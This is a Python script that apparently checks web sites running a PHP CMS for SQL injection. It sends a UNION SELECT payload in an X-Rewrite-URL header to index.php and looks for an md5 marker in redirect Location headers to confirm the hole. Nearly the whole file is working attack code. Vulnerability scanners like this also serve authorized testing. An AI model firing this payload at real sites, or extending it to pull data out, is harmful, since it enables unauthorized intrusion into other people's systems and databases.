import requests,re,urllib3
from hashlib import md5
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
r1=randomInt(40000, 44800)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
r2=randomInt(40000, 44800)
def scan(baseurl):
	url=baseurl+"/index.php?lang=Cn&index=1"
	headers={'X-Rewrite-URL': "1/2/404xxx' union select md5("+str(r1)+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#/index.php"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	reditList = response.history
	if len(reditList)>0:
		f_list=[]
		for response in reditList:
			if md5(str(r1).encode()).hexdigest() in response.headers["Location"]:
				f_list.append(1)
		if len(f_list)>0:
			r0=True
		else:
			r0=False
	else:
		if md5(str(r1).encode()).hexdigest() in response.headers["Location"]:
			r0=True
		else:
			r0=False
	if r0:
		return True
	else:
		return False
